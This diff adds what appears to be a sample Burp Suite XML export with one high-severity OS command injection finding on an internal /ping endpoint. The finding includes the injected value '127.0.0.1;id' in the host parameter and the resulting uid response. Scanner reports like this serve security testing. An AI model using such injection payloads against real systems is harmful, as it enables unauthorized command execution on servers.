@@ -1,0 +1,25 @@
+<?xml version="1.0"?>
+<!DOCTYPE issues>
+<issues burpVersion="2024.2" exportTime="Sat May 31 12:00:00 UTC 2026">
+  <issue>
+    <serialNumber>2001</serialNumber>
+    <type>2098944</type>
+    <name>OS command injection</name>
+    <host ip="10.0.0.7">http://app.internal</host>
+    <path>/ping</path>
+    <location>Parameter: host</location>
+    <severity>High</severity>
+    <confidence>Firm</confidence>
+    <issueBackground>OS command injection allows execution of arbitrary commands.</issueBackground>
+    <issueDetail>The host parameter is passed to a shell. Payload 127.0.0.1; id returned uid output.</issueDetail>
+    <requestresponses>
+      <requestresponse>
+        <request base64="false">GET /ping?host=127.0.0.1;id HTTP/1.1
+Host: app.internal</request>
+        <response base64="false">HTTP/1.1 200 OK
+
+uid=33(www-data)</response>
+      </requestresponse>
+    </requestresponses>
+  </issue>
+</issues>
